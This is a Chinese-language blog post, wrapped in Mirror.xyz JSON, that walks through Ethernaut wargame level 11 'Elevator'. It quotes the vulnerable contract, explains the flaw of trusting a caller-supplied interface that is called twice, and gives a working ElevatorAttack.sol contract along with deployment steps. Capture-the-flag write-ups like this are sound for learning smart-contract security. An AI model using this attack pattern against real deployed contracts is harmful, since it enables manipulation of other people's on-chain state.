"{\"content\":{\"body\":\"这一期更新，我们来讲讲Ethernaut的第11个Hacking挑战Elevator。\\n首先我们来看看代码。这一期代码看似简单，不过是一个合约Elevator+一个接口Building，但是经验告诉我们，不能被表象蒙蔽，简单的杀招最为致命。\\n\\n```\\n// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.6.0;\\r\\n\\r\\ninterface Building {\\r\\n  function isLastFloor(uint) external returns (bool);\\r\\n}\\r\\n\\r\\n\\r\\ncontract Elevator {\\r\\n  bool public top;\\r\\n  uint public floor;\\r\\n\\r\\n  function goTo(uint _floor) public {\\r\\n    Building building = Building(msg.sender);\\r\\n\\r\\n    if (! building.isLastFloor(_floor)) {\\r\\n      floor = _floor;\\r\\n      top = building.isLastFloor(floor);\\r\\n    }\\r\\n  }\\r\\n}\\n```\\n\\n接着，我们来看看挑战要求和提示。\\n\\n![](https://images.mirror-media.xyz/publication-images/k0xe30wbXJ1XOcEPS84Jq.png?height=262&width=984)\\n\\n读起来就和谜语一样：solidity不会遵守承诺？电梯会被用在建筑上？这到底是什么意思呢？\\n要解决这个问题，还是要回到我们最可靠的材料——代码上，看看它讲了一个怎样的故事。\\n\\n1. **代码解读**\\n   1）\\t合约Elevator首先定义了两个公共变量，布尔型的top和uint型的floor。顾名思义，top记录当前是否达到顶层，floor记录当前达到第几层。\\n   接下来是公共函数goTo，其参数为_floor。在函数中，创建了building接口。\\n   `Building building = Building( msg.sender)`\\n\\n   这句话的本意应该是Building合约从外部调用此函数（即为msg.sender ），从而使building能够用Building合约里的所有功能。但是我们并不控制Building合约，所以我们肯定是不能让此处的building正常行使职能的。在此，就要提到合约hacking的一个准则：**让合约不正常的行使职能**。所以，这个interface应该是我们突破口的一部分。\\n\\n   接下来的if语句就很耐人寻味了。如果(! building.isLastFloor(_floor))为真，那么执行完语句后的top就为假；如果(! building.isLastFloor(_floor))为假，那么根本就不会执行语句！所以，这就是这个挑战需要我们hack的地方了：使得top为真，即达到building的top。\\n\\n   2）\\t接口Building的函数isLastFloor读取uint参数，返回布尔值。并且，它的状态声明里没有view！这意味着我们可以随心所欲地**override**，从而完成我们的hacking大业。\\n2. **Hacking思路**\\n\\n   1） 合约hacking有一个亘古不破的原则：**最好的hacker是另一个合约**。结合我们在代码解读里获得的思路，我们可以这么做：新开另一个合约，在合约里重新定义一个函数isLastFloor。这样，在新合约中调用Elevator时，就会按照我们重写的isLastFloor的逻辑运行了。\\n\\n   2） 现在的关键是isLastFloor的逻辑。我们要达到的效果是，第一次调用它的时候结果为假，第二次调用它的时候结果为真。这个实现办法就多了。下面的代码提供了一种解决思路。\\n3. **Hacking实现**\\n\\n   1）\\tElevatorAttack.sol\\n\\n   ```\\n   // SPDX-License-Identifier: MIT\\r\\n   pragma solidity ^0.6.10;\\r\\n   \\r\\n   import \\\"./Elevator.sol\\\";\\r\\n   \\r\\n   contract ElevatorAttack {\\r\\n       Elevator public target;\\r\\n       bool public toggle = true;\\r\\n       constructor(address _address) public {\\r\\n           target = Elevator(_address);\\r\\n       }\\r\\n       \\r\\n       function isLastFloor(uint) public  returns(bool){\\r\\n           toggle = !toggle;\\r\\n           return toggle;\\r\\n       }\\r\\n       \\r\\n       function setFloor(uint _flo) public {\\r\\n           target.goTo(_flo);\\r\\n       }\\r\\n   }\\n   ```\\n\\n       2） 在Ethernaut页面的console中输入await contract.address，得到当前合约地址。同时，在Remix中部署这个地址（不要忘了环境要选择Injected Web3，用登录Ethernaut的同一地址），执行setFloor()。\\n\\n![](https://images.mirror-media.xyz/publication-images/Tg1o38BePLMJiij75e5mV.png?height=86&width=670)\\n\\n![](https://images.mirror-media.xyz/publication-images/dXaRVvnBDD1NS748zoF1s.png?height=226&width=598)\\n\\n![](https://images.mirror-media.xyz/publication-images/YBrcdL6LXJ6olkAJ2JizJ.png?height=386&width=544)\\n\\n       3） 再回到Ethernaut界面，执行await contract.floor() 以及 await contract.top()。Floor为刚才我们设定的值，top为true。恭喜，我们hacking成功了！可以Submit Instance了。\\n\\n![](https://images.mirror-media.xyz/publication-images/3iDcZ9ZM4rWPp-31lBDkm.png?height=446&width=762)\\n\\n如果我的讲解有任何错误，欢迎在我的推特中留言或者私信（@snow_elven）。如果您喜欢我的讲解，还请您帮忙宣传转发，小小打赏。 谢谢。\",\"timestamp\":1637077738,\"title\":\"Ethernaut Hacking Trip #11 Elevator（中文）\"},\"digest\":\"xZgMOr9X5vizm9YIMt3lgWXMrbKcbMYxuaMMI5gsgmU\",\"authorship\":{\"contributor\":\"0xeCCaD75BB404803a15A94058400C6Aed8311C8d3\",\"signingKey\":\"{\\\"crv\\\":\\\"P-256\\\",\\\"ext\\\":true,\\\"key_ops\\\":[\\\"verify\\\"],\\\"kty\\\":\\\"EC\\\",\\\"x\\\":\\\"B8oTtDnahtJCd48rqCxr19tg-IXyDQgMVrPPqACjAPU\\\",\\\"y\\\":\\\"k8Kaj7d61dVljRUNiZqwvRO5sCI9ftOtKpjB4pdGFGk\\\"}\",\"signature\":\"MPG0klSzzSF_uCWRDWW54gVQoG2tRdRtm7EEQCBqJ1LC460DAKz1Ik13w9JXrivSM1YCh5BBLBpEN2ugrb49_A\",\"signingKeySignature\":\"0x6b103511f8425a9261b81130d265054107c83edb30559ba27224903861064cb50a7b3c0d6362095a510ab6d2dbc7f54b7cb187622f067b1926adcb26d97de1041b\",\"signingKeyMessage\":\"I authorize publishing on mirror.xyz from this device using:\\n{\\\"crv\\\":\\\"P-256\\\",\\\"ext\\\":true,\\\"key_ops\\\":[\\\"verify\\\"],\\\"kty\\\":\\\"EC\\\",\\\"x\\\":\\\"B8oTtDnahtJCd48rqCxr19tg-IXyDQgMVrPPqACjAPU\\\",\\\"y\\\":\\\"k8Kaj7d61dVljRUNiZqwvRO5sCI9ftOtKpjB4pdGFGk\\\"}\",\"algorithm\":{\"name\":\"ECDSA\",\"hash\":\"SHA-256\"}},\"nft\":{},\"version\":\"12-21-2020\",\"originalDigest\":\"xZgMOr9X5vizm9YIMt3lgWXMrbKcbMYxuaMMI5gsgmU\"}"